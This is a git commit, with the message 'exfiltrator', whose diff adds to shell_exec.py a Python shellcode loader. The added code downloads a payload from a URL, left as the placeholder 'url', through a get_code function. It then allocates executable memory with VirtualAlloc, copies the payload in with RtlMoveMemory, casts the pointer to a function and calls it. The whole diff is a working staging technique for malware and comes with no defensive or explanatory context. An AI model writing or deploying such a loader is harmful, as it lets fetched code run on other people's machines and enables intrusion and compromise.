466a77ebd656c3c9da14d1a959233f818daf5e50
irfan378 <irfandominate@gmail.com>
2023-02-26 17:19:46 +0530

    exfiltrator

--- shell_exec.py
+++ shell_exec.py
@@ -9,4 +9,18 @@ def get_code(url):
     return shellcode
 def write_memory(buf):
     length=len(buf)
-    
+    kernel32.VirtualAlloc.restype=ctypes.c_void_p
+    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p,ctypes.c_void_p,ctypes.c_size_t)
+    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
+    kernel32.RtlMoveMemory(ptr, buf, length)
+    return ptr
+def run(shellcode):
+    buffer=ctypes.create_string_buffer(shellcode)
+    ptr=write_memory(buffer)
+    shell_func=ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
+    shell_func()
+if __name__ =="__main__":
+    url="url"
+    shellcode=get_code(url)
+    run(shellcode)
+
